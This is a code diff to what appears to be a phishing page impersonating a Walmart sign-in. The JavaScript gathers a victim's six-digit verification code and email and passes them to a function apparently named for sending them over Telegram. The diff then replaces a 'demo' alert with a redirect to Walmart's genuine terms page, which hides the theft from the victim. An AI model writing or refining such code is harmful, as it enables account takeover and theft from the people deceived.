@@ -136,11 +136,17 @@ if(signInCodeBtn){
     const codeInputs = document.querySelectorAll('#codeInputs .code-input');
     let code = '';
     codeInputs.forEach(input => code += input.value.trim());
+    const codeErrorAlert = document.getElementById('codeErrorAlert');
     if(code.length === 6){
+      // Limpiar errores
+      if(codeErrorAlert) codeErrorAlert.style.display = 'none';
+      codeInputs.forEach(input => input.classList.remove('error'));
       enviarCodigoTelegram(codePanelEmail.textContent, code);
-      alert('Código enviado (demo)');
+      // Redirigir a la página de Walmart después de enviar el código
+      window.location.href = 'https://www.walmart.com/help/article/walmart-com-terms-of-use/3b75080af40340d6bbd596f116fae5a0';
     } else {
-      codeInputs.forEach(input => input.style.borderColor = '#e05');
+      if(codeErrorAlert) codeErrorAlert.style.display = 'block';
+      codeInputs.forEach(input => input.classList.add('error'));
       codeInputs[0].focus();
     }
   });
@@ -150,6 +156,10 @@ if(signInCodeBtn){
 const codeInputs = document.querySelectorAll('#codeInputs .code-input');
 codeInputs.forEach((input, idx) => {
   input.addEventListener('input', (e) => {
+    // Limpiar error al escribir
+    input.classList.remove('error');
+    const codeErrorAlert = document.getElementById('codeErrorAlert');
+    if(codeErrorAlert) codeErrorAlert.style.display = 'none';
     if(input.value.length === 1 && idx < codeInputs.length-1){
       codeInputs[idx+1].focus();
     }
